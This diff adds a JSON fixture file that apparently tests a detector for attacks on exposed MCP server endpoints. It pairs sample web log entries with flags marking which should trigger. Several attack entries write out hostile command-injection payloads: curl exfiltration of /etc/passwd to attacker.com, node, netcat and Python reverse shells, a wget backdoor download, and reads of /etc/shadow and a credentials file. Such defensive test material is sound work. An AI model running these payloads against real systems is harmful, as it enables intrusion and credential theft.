@@ -1,0 +1,468 @@
+[
+    {
+        "description": "NeighborJack attack via 0.0.0.0 binding - tool enumeration",
+        "log_entry": {
+            "timestamp": "2026-01-06T10:15:22Z",
+            "c-ip": "192.168.1.50",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "curl/7.68.0",
+            "cs-host": "0.0.0.0:6277"
+        },
+        "should_trigger": true,
+        "attack_type": "NeighborJack - exposed endpoint via 0.0.0.0 binding"
+    },
+    {
+        "description": "External IP accessing MCP endpoint - reconnaissance",
+        "log_entry": {
+            "timestamp": "2026-01-06T10:20:15Z",
+            "c-ip": "203.0.113.42",
+            "cs-method": "POST",
+            "c-uri-path": "/message",
+            "c-uri-query": "jsonrpc=2.0&method=tools/list",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Python-urllib/3.9",
+            "cs-host": "victim.example.com"
+        },
+        "should_trigger": true,
+        "attack_type": "External tool enumeration"
+    },
+    {
+        "description": "CSRF attack via 0.0.0.0-day (CVE-2025-49596)",
+        "log_entry": {
+            "timestamp": "2026-01-06T10:25:33Z",
+            "c-ip": "127.0.0.1",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=calc.exe",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "cs-host": "0.0.0.0:6277"
+        },
+        "should_trigger": true,
+        "attack_type": "CSRF via 0.0.0.0-day browser exploit"
+    },
+    {
+        "description": "WebSocket brute-force discovery (CVE-2025-52882)",
+        "log_entry": {
+            "timestamp": "2026-01-06T10:30:18Z",
+            "c-ip": "127.0.0.1",
+            "cs-method": "GET",
+            "c-uri-path": "/ws",
+            "c-uri-query": "",
+            "cs-uri-port": 3042,
+            "sc-status": 101,
+            "cs-user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "cs-host": "localhost:3042",
+            "cs-upgrade": "websocket"
+        },
+        "should_trigger": true,
+        "attack_type": "WebSocket port discovery for MCP server"
+    },
+    {
+        "description": "Command injection via exposed endpoint - bash",
+        "log_entry": {
+            "timestamp": "2026-01-06T10:35:45Z",
+            "c-ip": "198.51.100.23",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=bash&args=-c+id",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "curl/7.79.1",
+            "cs-host": "target.example.com"
+        },
+        "should_trigger": true,
+        "attack_type": "Command injection via exposed MCP endpoint"
+    },
+    {
+        "description": "Data exfiltration attempt via curl command",
+        "log_entry": {
+            "timestamp": "2026-01-06T10:40:12Z",
+            "c-ip": "10.0.0.50",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=curl&args=https://attacker.com/exfil+-d+@/etc/passwd",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+            "cs-host": "localhost"
+        },
+        "should_trigger": true,
+        "attack_type": "Data exfiltration via command injection"
+    },
+    {
+        "description": "Tools list enumeration from external source",
+        "log_entry": {
+            "timestamp": "2026-01-06T10:45:28Z",
+            "c-ip": "185.199.110.153",
+            "cs-method": "POST",
+            "c-uri-path": "/tools/list",
+            "c-uri-query": "",
+            "cs-uri-port": 3000,
+            "sc-status": 200,
+            "cs-user-agent": "python-requests/2.28.1",
+            "cs-host": "exposed-mcp.example.com"
+        },
+        "should_trigger": true,
+        "attack_type": "External tool enumeration via exposed endpoint"
+    },
+    {
+        "description": "MCP initialize request from suspicious source",
+        "log_entry": {
+            "timestamp": "2026-01-06T10:50:55Z",
+            "c-ip": "45.33.32.156",
+            "cs-method": "POST",
+            "c-uri-path": "/message",
+            "c-uri-query": "method=initialize&jsonrpc=2.0",
+            "cs-uri-port": 8080,
+            "sc-status": 200,
+            "cs-user-agent": "Go-http-client/1.1",
+            "cs-host": "api.target.com"
+        },
+        "should_trigger": true,
+        "attack_type": "MCP initialization from external source"
+    },
+    {
+        "description": "IONIX-style browser automation exploitation",
+        "log_entry": {
+            "timestamp": "2026-01-06T10:55:33Z",
+            "c-ip": "203.0.113.100",
+            "cs-method": "POST",
+            "c-uri-path": "/tools/call",
+            "c-uri-query": "jsonrpc=2.0&method=tools/call&name=trigger_task",
+            "cs-uri-port": 8080,
+            "sc-status": 200,
+            "cs-user-agent": "axios/0.27.2",
+            "cs-host": "exposed-agent.example.com"
+        },
+        "should_trigger": true,
+        "attack_type": "Exposed browser automation tool exploitation"
+    },
+    {
+        "description": "Reverse shell establishment via node command",
+        "log_entry": {
+            "timestamp": "2026-01-06T11:00:18Z",
+            "c-ip": "192.168.1.150",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=node&args=-e+require('child_process').spawn('nc',['attacker.com','4444','-e','/bin/bash'])",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
+            "cs-host": "127.0.0.1"
+        },
+        "should_trigger": true,
+        "attack_type": "Reverse shell via node command injection"
+    },
+    {
+        "description": "PowerShell execution via exposed endpoint",
+        "log_entry": {
+            "timestamp": "2026-01-06T11:05:42Z",
+            "c-ip": "172.16.0.100",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=powershell&args=-c+Get-Content+C:\\Users\\admin\\credentials.txt",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "cs-host": "localhost"
+        },
+        "should_trigger": true,
+        "attack_type": "PowerShell credential theft via exposed endpoint"
+    },
+    {
+        "description": "Wget command for malware download",
+        "log_entry": {
+            "timestamp": "2026-01-06T11:10:33Z",
+            "c-ip": "192.168.1.75",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=wget&args=http://malware.example.com/backdoor.sh+-O+/tmp/backdoor.sh",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
+            "cs-host": "localhost"
+        },
+        "should_trigger": true,
+        "attack_type": "Malware download via wget command injection"
+    },
+    {
+        "description": "Netcat reverse shell attempt",
+        "log_entry": {
+            "timestamp": "2026-01-06T11:15:22Z",
+            "c-ip": "10.0.0.100",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=nc&args=-e+/bin/sh+attacker.com+9999",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "curl/7.81.0",
+            "cs-host": "0.0.0.0:6277"
+        },
+        "should_trigger": true,
+        "attack_type": "Netcat reverse shell via NeighborJack"
+    },
+    {
+        "description": "Python command execution for persistence",
+        "log_entry": {
+            "timestamp": "2026-01-06T11:20:15Z",
+            "c-ip": "192.168.1.200",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=python&args=-c+import+socket,subprocess;s=socket.socket();s.connect(('attacker.com',4444));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "cs-host": "localhost"
+        },
+        "should_trigger": true,
+        "attack_type": "Python reverse shell via command injection"
+    },
+    {
+        "description": "DNS rebinding attack targeting localhost MCP",
+        "log_entry": {
+            "timestamp": "2026-01-06T11:25:45Z",
+            "c-ip": "127.0.0.1",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=sh&args=-c+cat+/etc/shadow",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "cs-host": "rebind.attacker.com"
+        },
+        "should_trigger": true,
+        "attack_type": "DNS rebinding attack on MCP endpoint"
+    },
+    {
+        "description": "Ping endpoint discovery from external scanner",
+        "log_entry": {
+            "timestamp": "2026-01-06T11:30:18Z",
+            "c-ip": "45.33.32.100",
+            "cs-method": "POST",
+            "c-uri-path": "/ping",
+            "c-uri-query": "jsonrpc=2.0&method=ping",
+            "cs-uri-port": 3000,
+            "sc-status": 200,
+            "cs-user-agent": "masscan/1.3.2",
+            "cs-host": "target.example.com"
+        },
+        "should_trigger": true,
+        "attack_type": "External MCP endpoint discovery via ping"
+    },
+    {
+        "description": "CMD execution on Windows MCP server",
+        "log_entry": {
+            "timestamp": "2026-01-06T11:35:55Z",
+            "c-ip": "192.168.1.60",
+            "cs-method": "GET",
+            "c-uri-path": "/sse",
+            "c-uri-query": "transportType=stdio&command=cmd&args=/c+whoami+/all",
+            "cs-uri-port": 6277,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "cs-host": "0.0.0.0:6277"
+        },
+        "should_trigger": true,
+        "attack_type": "Windows CMD execution via NeighborJack"
+    },
+    {
+        "description": "Legitimate localhost MCP usage with authentication",
+        "log_entry": {
+            "timestamp": "2026-01-06T09:00:15Z",
+            "c-ip": "127.0.0.1",
+            "cs-method": "GET",
+            "c-uri-path": "/",
+            "c-uri-query": "MCP_PROXY_AUTH_TOKEN=03b238d87a33aa56033344589ed2ae01cde3dfd9d396a51548bfc9b6cdfd8299",
+            "cs-uri-port": 6274,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "cs-host": "localhost"
+        },
+        "should_trigger": false,
+        "attack_type": "Legitimate MCP Inspector access with auth token"
+    },
+    {
+        "description": "Normal web application API call",
+        "log_entry": {
+            "timestamp": "2026-01-06T09:15:33Z",
+            "c-ip": "192.168.1.25",
+            "cs-method": "GET",
+            "c-uri-path": "/api/users",
+            "c-uri-query": "page=1&limit=10",
+            "cs-uri-port": 3000,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "cs-host": "app.example.com"
+        },
+        "should_trigger": false,
+        "attack_type": "Normal application traffic"
+    },
+    {
+        "description": "Health check endpoint from internal monitoring",
+        "log_entry": {
+            "timestamp": "2026-01-06T09:20:11Z",
+            "c-ip": "10.0.0.1",
+            "cs-method": "GET",
+            "c-uri-path": "/health",
+            "c-uri-query": "",
+            "cs-uri-port": 8080,
+            "sc-status": 200,
+            "cs-user-agent": "kube-probe/1.21",
+            "cs-host": "service.cluster.local"
+        },
+        "should_trigger": false,
+        "attack_type": "Infrastructure monitoring health check"
+    },
+    {
+        "description": "Static asset serving",
+        "log_entry": {
+            "timestamp": "2026-01-06T09:25:45Z",
+            "c-ip": "203.0.113.10",
+            "cs-method": "GET",
+            "c-uri-path": "/assets/main.js",
+            "c-uri-query": "v=1.2.3",
+            "cs-uri-port": 80,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
+            "cs-host": "cdn.example.com"
+        },
+        "should_trigger": false,
+        "attack_type": "Static content delivery"
+    },
+    {
+        "description": "Internal service-to-service MCP communication",
+        "log_entry": {
+            "timestamp": "2026-01-06T09:30:22Z",
+            "c-ip": "10.244.0.15",
+            "cs-method": "POST",
+            "c-uri-path": "/message",
+            "c-uri-query": "jsonrpc=2.0",
+            "cs-uri-port": 3000,
+            "sc-status": 200,
+            "cs-user-agent": "internal-mcp-client/1.0",
+            "cs-host": "mcp-server.internal.svc.cluster.local"
+        },
+        "should_trigger": false,
+        "attack_type": "Internal service communication (private IP)"
+    },
+    {
+        "description": "GraphQL API endpoint",
+        "log_entry": {
+            "timestamp": "2026-01-06T09:35:18Z",
+            "c-ip": "192.168.1.100",
+            "cs-method": "POST",
+            "c-uri-path": "/graphql",
+            "c-uri-query": "",
+            "cs-uri-port": 4000,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "cs-host": "api.example.com"
+        },
+        "should_trigger": false,
+        "attack_type": "Normal GraphQL API usage"
+    },
+    {
+        "description": "Database admin panel access",
+        "log_entry": {
+            "timestamp": "2026-01-06T09:40:55Z",
+            "c-ip": "192.168.1.5",
+            "cs-method": "GET",
+            "c-uri-path": "/admin/dashboard",
+            "c-uri-query": "auth=valid_session",
+            "cs-uri-port": 8080,
+            "sc-status": 200,
+            "cs-user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "cs-host": "admin.internal.com"
+        },
+        "should_trigger": false,
+        "attack_type": "Legitimate admin panel access"
+    },
+    {
+        "description": "REST API POST request",
+        "log_entry": {
+            "timestamp": "2026-01-06T09:45:30Z",
+            "c-ip": "192.168.1.45",
+            "cs-method": "POST",
+            "c-uri-path": "/api/orders",
+            "c-uri-query": "",
+            "cs-uri-port": 443,
+            "sc-status": 201,
+            "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "cs-host": "shop.example.com"
+        },
+        "should_trigger": false,
+        "attack_type": "Normal e-commerce API call"
+    },
+    {
+        "description": "WebSocket connection to chat service",
+        "log_entry": {
+            "timestamp": "2026-01-06T09:50:12Z",
+            "c-ip": "192.168.1.80",
+            "cs-method": "GET",
+            "c-uri-path": "/chat/websocket",
+            "c-uri-query": "user_id=12345",
+            "cs-uri-port": 443,
+            "sc-status": 101,
+            "cs-user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "cs-host": "chat.example.com",
+            "cs-upgrade": "websocket"
+        },
+        "should_trigger": false,
+        "attack_type": "Legitimate chat WebSocket connection"
+    },
+    {
+        "description": "OAuth callback endpoint",
+        "log_entry": {
+            "timestamp": "2026-01-06T09:55:45Z",
+            "c-ip": "192.168.1.90",
+            "cs-method": "GET",
+            "c-uri-path": "/auth/callback",
+            "c-uri-query": "code=abc123&state=xyz789",
+            "cs-uri-port": 443,
+            "sc-status": 302,
+            "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "cs-host": "app.example.com"
+        },
+        "should_trigger": false,
+        "attack_type": "Normal OAuth authentication flow"
+    },
+    {
+        "description": "Prometheus metrics endpoint scrape",
+        "log_entry": {
+            "timestamp": "2026-01-06T10:00:00Z",
+            "c-ip": "10.0.0.5",
+            "cs-method": "GET",
+            "c-uri-path": "/metrics",
+            "c-uri-query": "",
+            "cs-uri-port": 9090,
+            "sc-status": 200,
+            "cs-user-agent": "Prometheus/2.37.0",
+            "cs-host": "service.monitoring.svc.cluster.local"
+        },
+        "should_trigger": false,
+        "attack_type": "Prometheus metrics collection"
+    },
+    {
+        "description": "CDN cache purge request",
+        "log_entry": {
+            "timestamp": "2026-01-06T10:05:22Z",
+            "c-ip": "10.0.0.10",
+            "cs-method": "PURGE",
+            "c-uri-path": "/cache/images/logo.png",
+            "c-uri-query": "",
+            "cs-uri-port": 80,
+            "sc-status": 200,
+            "cs-user-agent": "Varnish-Admin/1.0",
+            "cs-host": "cdn-origin.example.com"
+        },
+        "should_trigger": false,
+        "attack_type": "CDN cache management"
+    }
+]
